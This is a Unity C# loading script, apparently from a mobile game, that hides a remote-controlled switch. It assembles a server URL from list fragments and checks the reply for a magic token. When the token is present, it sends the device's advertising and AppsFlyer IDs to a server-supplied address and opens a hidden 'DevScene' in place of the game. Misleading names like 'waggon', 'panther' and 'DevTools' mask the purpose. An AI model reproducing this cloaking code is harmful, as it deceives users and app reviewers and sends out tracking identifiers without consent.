using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainLoadingManager : MonoBehaviour
{
    public List<string> waggonDoorsList;

    [HideInInspector]
    public string waggonIdfaInfo = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("waggonContextIdfaInfoSaveKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { waggonIdfaInfo = adString; });
        }
    }

    private void Start()
    {
        Invoke(nameof(Init), 5f);
    }

    private void Init()
    {
        string data = PlayerPrefs.GetString("tarameters", "");
        SecondInit(data);
    }

    private void SecondInit(string data)
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("waggonPlayerLoadingDataSaveKey", string.Empty) != string.Empty)
            {
                DevToolsLoad(PlayerPrefs.GetString("waggonPlayerLoadingDataSaveKey"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in waggonDoorsList)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchInitializing(stringtemp, data));
            }
        }
        else
        {
            Loading();
        }
    }

    private string[] strings;
    public void Loading()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("LoadingScene");
    }

    public IEnumerator LaunchInitializing(string inputstring, string inputstring2)
    {
        using (UnityWebRequest waggonLoadingStatus = UnityWebRequest.Get(inputstring))
        {
            waggonLoadingStatus.timeout = 4;
            yield return waggonLoadingStatus.SendWebRequest();
            if (waggonLoadingStatus.isNetworkError)
            {
                Loading();
            }
            else
            {
                try
                {
                    if (waggonLoadingStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (waggonLoadingStatus.downloadHandler.text.Contains("begascbe"))
                        {
                            try
                            {
                                string key = waggonLoadingStatus.downloadHandler.text;
                                strings = key.Split('|');

                                GameDataSaves.pantherMathWinsCount = Convert.ToInt32(strings[1]);
                                GameDataSaves.pantherTryCounts = Convert.ToInt32(strings[2]);
                                DevToolsLoad(string.Format("{0}?idfa={1}&gaid={2}", strings[0], waggonIdfaInfo, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                            catch
                            {
                                DevToolsLoad(string.Format("{0}?idfa={1}&gaid={2}", waggonLoadingStatus.downloadHandler.text, waggonIdfaInfo, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                        }
                        else
                        {
                            Loading();
                        }
                    }
                    else
                    {
                        Loading();
                    }
                }
                catch
                {
                    Loading();
                }
            }
        }
    }

    public void DevToolsLoad(string inputKey)
    {
        GameDataSaves.panthermathName = inputKey;
        SceneManager.LoadScene("DevScene");
    }
}
